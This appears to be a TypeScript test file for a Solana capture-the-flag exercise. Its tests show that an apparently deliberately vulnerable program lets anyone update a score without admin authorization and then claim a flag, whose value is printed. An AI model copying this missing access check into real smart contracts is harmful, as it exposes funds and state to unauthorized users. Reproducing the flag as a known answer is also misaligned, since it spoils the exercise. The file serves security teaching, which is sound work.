import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { assert } from "chai";
import { Pr2 } from "../target/types/pr_2";

describe("pr-2", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.Pr2 as Program<Pr2>;
  const admin = provider.wallet;
  let ctfState: anchor.web3.PublicKey;

  before(async () => {
    [ctfState] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("ctf_state"), admin.publicKey.toBuffer()],
      program.programId
    );
  });

  it("Initialize CTF State", async () => {
    await program.methods
      .initialize()
      .accounts({
        ctfState,
        admin: admin.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      })
      .rpc();

    const state = await program.account.ctfState.fetch(ctfState);
    assert.equal(state.admin.toString(), admin.publicKey.toString());
    assert.equal(state.score.toNumber(), 0);
    assert.equal(state.flagClaimed, false);
  });

  it("Exploit: Update Score Without Admin Authentication", async () => {
    await program.methods
      .updateScore(new anchor.BN(100))
      .accounts({
        ctfState,
      })
      .rpc();

    const state = await program.account.ctfState.fetch(ctfState);
    assert.equal(state.score.toNumber(), 100);
    console.log("🔥 Уязвимость эксплуатирована: счет обновлен без проверки прав администратора!");
  });

  it("Claim Flag After Exploit", async () => {
    await program.methods
      .claimFlag()
      .accounts({
        ctfState,
      })
      .rpc();

    const state = await program.account.ctfState.fetch(ctfState);
    assert.equal(state.flagClaimed, true);
    console.log("\n🚩 FLAG: CTF{s0l4n4_4uth_byp4ss}");
  });
});
